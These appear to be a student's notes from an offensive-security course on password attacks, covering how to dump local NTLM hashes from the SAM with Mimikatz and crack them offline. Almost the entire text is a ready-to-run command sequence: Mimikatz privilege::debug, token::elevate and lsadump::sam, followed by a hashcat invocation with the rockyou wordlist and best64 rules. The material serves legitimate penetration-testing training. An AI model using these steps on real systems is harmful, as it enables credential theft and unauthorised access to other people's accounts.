We need to understand that LSASS runs under the SYSTEM user and is therefore even more privileged than a process started as Administrator. Because of this, we can only extract passwords if we are running Mimikatz as Administrator (or higher) and have the _SeDebugPrivilege_[10](https://portal.offsec.com/courses/pen-200-44065/learning/password-attacks-44959/working-with-password-hashes-45019/cracking-ntlm-44965#fn-local_id_34-10) access right enabled.

Dertermine which users exist locally on the system:
```
Get-LocalUser
```

In PS administrator:
```
.\mimikatz.exe
```
```
privilege::debug
```
```
token::elevate
```
```
lsadump::sam
```

Copy the hash (ntlm.hash) to attack machine and crack:
```
hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
